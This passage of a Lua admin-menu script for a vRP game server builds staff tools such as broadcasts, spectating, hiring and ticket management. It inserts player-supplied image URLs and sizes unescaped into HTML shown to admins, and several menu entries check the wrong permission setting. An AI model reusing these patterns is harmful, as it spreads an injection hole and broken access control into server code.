                animation = {open = "gta_effects_fade_in", close = "gta_effects_fade_out"}
            })
        else
            local broadcastPicture = msg
            vRP.prompt({player,"(default لا تكتب شيء اذا تباه) العرض","",function (player , width)
                vRP.prompt({player,"(default لا تكتب شيء اذا تباه) الطول","",function (player , height)
                    if tonumber(width) == nil then width = 200 else width = tonumber(width) end
                    if tonumber(height) == nil then height = 200 else height = tonumber(height) end
                    for index, admin in pairs(getAdmins()) do
                        TriggerClientEvent("afadminpack:SendNotification",admin,{
                            text = [[<html>
                            <style>
                            h1 {text-align: center;}
                            h2 {text-align: center;}
                            img {text-align: center;}
                            .size {
                                width:]]..width..[[px;
                                height: ]]..height..[[px;
                            }
                            </style>
                            <h1>صورة للأدارة</h1>
                            <h2>من أيدي <span style="color:#E19302">]]..user_id..[[</br></br>
                            <pictre>
                            <img src="]]..broadcastPicture..[[" class="size"></img>
                            </picture>
                            </h2>
                            </html>]],
                            type = "info",
                            timeout = (8000),
                            layout = "centerRight",
                            queue = "global",
                            sounds = {
                            sources = {"notification.mp3"},
                            volume = 0.7, 
                            conditions = {"docVisible"}
                            },
                            animation = {open = "gta_effects_fade_in", close = "gta_effects_fade_out"}               
                        })
                    end
                    logToDiscord(
                        "broadcastPicture",
                        "*قام الأيدي " .. vRP.getUserId({player}) .. " بأرسال صورة للأدارة*\n\r" .. broadcastPicture
                    )
                end})
            end})
        end
    end})       
end

---------- Advanced Check For Permission Function
checkForPermission = function(setting, user_id, callback)
    local permission = setting["phoneSettings"].PERMISSION
    if permission ~= nil and permission ~= "" then
        if vRP.hasPermission({user_id,permission}) then
            callback()
        end
    else
        callback()
    end   
end

---------- Phone Menu
local deleteObjectGunToggled = {}
vRP.registerMenuBuilder({"admin", function(add, data)
    local user_id = vRP.getUserId({data.player})
    if user_id == nil then return end
    local choices = {}
    local name = config.viewAdminList.phoneSettings.NAME or "Admin List"
    checkForPermission(config.viewAdminList, user_id, function()
        choices[name] = {function(player)
            local menu = {}
            menu.name = name
            menu.css = {top = "75px", header_color = "rgba(0,0,255,0.75)"}
            menu.onclose = function(player) vRP.openMainMenu({player}) end
            local admins = getAdmins()
            for index, preadmin in pairs(admins) do
                local admin = splitString(preadmin, "||")[1]
                local adminId = vRP.getUserId({admin})
                admin = vRP.getUserSource({adminId})
                menu[GetPlayerName(admin)] = {function(player)
                    local submenu = {}
                    submenu.name = GetPlayerName(admin)
                    submenu.css = {top = "75px", header_color = "rgba(0,0,255,0.75)"}
                    submenu.onclose = function(player) vRP.openMenu({player, menu}) end
                    submenu["الانتقال"] = {function(player)
                        vRPclient.getPosition(admin, {}, function(x,y,z)
                            vRPclient.teleport(player, {x,y,z})
                            notifyPlayer(player, "لقد انتقلت الى الأيدي " .. adminId, 'success')
                        end)
                    end}
                    submenu["المراقبة"] = {function(player)
                        if player == admin then
                            notifyPlayer(player, "لا يمكنك مراقبة نفسك", 'error')
                        else
                            if inSpectate[user_id] == nil then
                                notifyPlayer(player, "تراقب الأن الأيدي " .. adminId, 'success') 
                                TriggerClientEvent('startSpectate', player, admin)
                                inSpectate[user_id] = true
                            else
                                Unspectate(player)
                                inSpectate[user_id] = nil
                            end
                        end
                    end}
                    vRP.openMenu({player, submenu})
                end,"<span style='color:white;'>ID:</span> <span style='color:#E19302;'>" .. adminId .. "</span></br><span style='color:white;'>Rank:</span> <span style='color:#E19302;'>" .. splitString(preadmin, "||")[2] .. "</span>"}
            end
            vRP.openMenu({player, menu})
        end}
    end)
    name = config.togglePVP.phoneSettings.NAME or "PVP"
    checkForPermission(config.togglePVP, user_id, function()
        choices[name] = {function(player)
            local menu = {}
            menu.name = name
            menu.css = {top = "75px", header_color = "rgba(0,0,255,0.75)"}
            menu.onclose = function(player) vRP.openMainMenu({player}) end
            menu["تشغيل"] = {function(player)
                TriggerClientEvent("togglePVP", player, true)
                notifyPlayer(player, "تم تشغيل القتل", 'success')
                logToDiscord(
                    config.togglePVP,
                    "لقد قام الأيدي " .. user_id .. " بتشغيل القتل||713082"
                )
            end}
            menu["أيقاف"] = {function(player)
                TriggerClientEvent("togglePVP", player, false)
                notifyPlayer(player, "تم اقاف القتل", 'error')
                logToDiscord(
                    config.togglePVP,
                    "لقد قام الأيدي " .. user_id .. " بأيقاف القتل||16711680"
                )
            end}
            vRP.openMenu({player, menu})   
        end}
    end)
    name = config.changeUserId.phoneSettings.NAME or "تغيير أيدي"
    checkForPermission(config.changeUserId, user_id, function()
        choices[name] = {changeUserId}
    end)
    name = config.callAdmin.phoneSettings.NAME or "طلب ادمن"
    checkForPermission(config.callAdmin, user_id, function()
        choices[name] = {callAdmin}
    end)
    name = config.weaponPack.phoneSettings.NAME or "أسلحة الأدارة"
    checkForPermission(config.weaponPack, user_id, function()
        choices[name] = {weaponPack}
    end)
    name = config.bringHandcuffed.phoneSettings.NAME or "سحب لاعب مكلبش"
    checkForPermission(config.bringHandcuffed, user_id, function()
        choices[name] = {bringHandcuffed}
    end)
    name = config.giveVehicleDatabase.phoneSettings.NAME or "اضافة مركبه اوفلاين"
    checkForPermission(config.giveVehicleDatabase, user_id, function()
        choices[name] = {giveVehicleDatabase}
    end)
    name = config.jailOffline.phoneSettings.NAME or "سجن اوفلاين"
    checkForPermission(config.jailOffline, user_id, function()
        choices[name] = {jailOffline}
    end)
    name = config.Broadcast.phoneSettings.NAME or "ارسال رسالة او صورة"
    checkForPermission(config.Broadcast, user_id, function()
        choices[name] = {function(player)
            local menu = {}
            menu.name = name
            menu.css = {top = "75px", header_color = "rgba(0,0,255,0.75)"}
            menu.onclose = function(player) vRP.openMainMenu({player}) end
            menu["ارسال رسالة للأدارة"] = {broadcastTextAdmin}
            menu["ارسال صورة للأدارة"] = {broadcastPictureAdmin}
            menu["ارسال رسالة للمواطنين"] = {broadcastTextGlobal}
            menu["ارسال صورة للمواطنين"] = {broadcastPictureGlobal}
            vRP.openMenu({player, menu})
        end}
    end)
    name = config.addManager.phoneSettings.NAME or "توظيف لاعب"
    checkForPermission(config.addManager, user_id, function()
        choices[name] = {function(player)
            local menu = {}
            menu.name = name
            menu.css = {top = "75px", header_color = "rgba(0,0,255,0.75)"}
            menu.onclose = function(player) vRP.openMainMenu({player}) end
            for index, group in pairs(config.managmentGroups) do
                menu[group] = {function(player)
                    vRP.prompt({player,":أيدي اللاعب","",function (player , id)
                        id = parseInt(id)
                        vRP.addUserGroup({id, group})
                        notifyPlayer(player, "تم توظيف الأيدي " .. id, 'success')
                        logToDiscord(
                            config.addManager,
                            "لقد قام الأيدي " .. user_id .. " بتوظيف الأيدي " .. id .. "\n\r" .. "الرتبة: " .. "**"..group.."**"
                        )
                    end})
                end}
            end
            vRP.openMenu({player, menu})
        end}
    end)
    name = config.removeManager.phoneSettings.NAME or "طرد أداري"
    checkForPermission(config.removeManager, user_id, function()
        choices[name] = {function(player)
            local function updateMenu()
                local menu = {}
                menu.name = name
                menu.css = {top = "75px", header_color = "rgba(0,0,255,0.75)"}
                menu.onclose = function(player) vRP.openMainMenu({player}) end
                local admins = getAdmins()
                for index, preadmin in pairs(admins) do
                    local admin = splitString(preadmin, "||")[1]
                    local adminId = vRP.getUserId({admin})
                    menu[GetPlayerName(admin)] = {function(player)
                        for index, group in pairs(config.managmentGroups) do
                            if vRP.hasGroup({adminId, group}) then
                                vRP.removeUserGroup({adminId,group})
                            end
                        end
                        notifyPlayer(player, GetPlayerName(admin) .." ".. "("..adminId..")" .. " لقد طردت", 'success')
                        logToDiscord(
                            config.removeManager,
                            "لقد قام الأيدي " .. user_id .. " بطرد الأيدي " .. adminId .. " من الأدارة"
                        )
                        updateMenu()
                    end}
                end
                vRP.openMenu({player, menu})
            end
            updateMenu()
        end}
    end)
    name = config.ticketManager.phoneSettings.NAME or "ادارة التكتات"
    checkForPermission(config.Spectate, user_id, function()
        choices[name] = {function(player)
            local menu = {}
            menu.name = name
            menu.css = {top = "75px", header_color = "rgba(0,0,255,0.75)"}
            menu.onclose = function(player) vRP.openMainMenu({player}) end
            menu["فحص"] = {function(player)
                vRP.prompt({player, "أكتب أيدي الأداري", "", function(player, id)
                    if id ~= "" then
                        id = parseInt(id)
                        local user = vRP.getUserSource({id})
                        getTickets(user, function(tickets)
                            TriggerClientEvent("afadminpack:SendNotification",player,{
                                text = [[<html>
                                <style>
                                h1 {text-align: center;}
                                h2 {text-align: center;}
                                </style><h1>]]
                                ..GetPlayerName(user)..[[ <span style='color:#ffa500;'>تكتات </span></h1>
                                <h2><b>التكتات الحالية: </b><span style='color:#ffa500;'>]]..tickets.session..[[</span></h2>
                                <h2><b>كل التكتات: </b><span style='color:#ffa500;'>]]..tickets.total..[[</span></h2>
                                </html>]],
                                type = "info",
                                timeout = (4000),
                                layout = "centerRight",
                                queue = "global",
                                animation = {open = "gta_effects_fade_in", close = "gta_effects_fade_out"}
                            })
                        end)
                    else
                        notifyPlayer(player, "عليك كتابةأيدي", 'error')
                    end
                end})
            end}
            menu["حذف"] = {function(player)
                vRP.prompt({player, "أكتب أيدي الأداري", "", function(player, id)
                    if id ~= "" then
                        id = parseInt(id)
                        local user = vRP.getUserSource({id})
                        deleteTickets(user)
                        notifyPlayer(player, "لقد مسحت تكتات الأيدي " .. id, 'success')
                    else
                        notifyPlayer(player, "عليك كتابةأيدي", 'error')
                    end
                end})
            end}
            vRP.openMenu({player, menu})   
        end}
    end)
    name = config.Spectate.phoneSettings.NAME or "مراقبة"
    checkForPermission(config.Spectate, user_id, function()
        choices[name] = {Spectate}
    end)
    name = config.deleteAllCars.phoneSettings.NAME or "حذف جميع السيارات بدون لاعب"
    checkForPermission(config.ticketManager, user_id, function()
        choices[name] = {deleteAllCars}
    end)
    name = config.toggleDeleteObjectGun.phoneSettings.NAME or "سلاح الحذف"
    checkForPermission(config.toggleDeleteObjectGun, user_id, function()
        choices[name] = {function(player)
            if deleteObjectGunToggled[vRP.getUserId({player})] == nil then
                deleteObjectGunToggled[vRP.getUserId({player})] = true
                TriggerClientEvent('toggleDeleteObjectGun', player)
                notifyPlayer(player, "لقد قمت بتشغيل سلاح الحذف", 'success')
                logToDiscord(
                    config.toggleDeleteObjectGun,
                    "قام الأيدي " .. vRP.getUserId({player}) .. " بتشغيل سلاح الحذف||713082"
                )
            else
                deleteObjectGunToggled[vRP.getUserId({player})] = nil
                TriggerClientEvent('toggleDeleteObjectGun', player)
                notifyPlayer(player, "لقد قمت بأيقاف سلاح الحذف", 'error')
                logToDiscord(
                    config.toggleDeleteObjectGun,
                    "قام الأيدي " .. vRP.getUserId({player}) .. " بأيقاف سلاح الحذف||16711680"
                )
            end
        end}
    end)
    name = config.showGroups.phoneSettings.NAME or "أظهار رتب"
    checkForPermission(config.showGroups, user_id, function()
        choices[name] = {function(player)
            vRP.prompt({player, "أكتب أيدي اللاعب", "", function(player, id)
                if id ~= "" then
                    id = parseInt(id)
                    local user = vRP.getUserSource({id})
                    if user ~= nil then
                        TriggerClientEvent("afadminpack:SendNotification",player,{
                            text = [[<html>
                            <style>
                            h1 {text-align: center;}
                            h2 {text-align: center;}
                            </style><h1>]]
                            ..GetPlayerName(user)..[[ <span style='color:#ffa500;'>رتب اللاعب</span> ]] .. "(" ..vRP.getUserId({user}).. ")" .. [[</h1>
                            <h2><b>]].. printGroups(player) ..[[</b></h2>
                            </html>]],
                            type = "info",
                            timeout = (4000),
                            layout = "centerRight",
                            queue = "global",
                            animation = {open = "gta_effects_fade_in", close = "gta_effects_fade_out"}
                        })
                    end
                else
                    notifyPlayer(player, "عليك كتابةأيدي", 'error')
                end
            end})
        end}
    end)
    add(choices)
end})
end
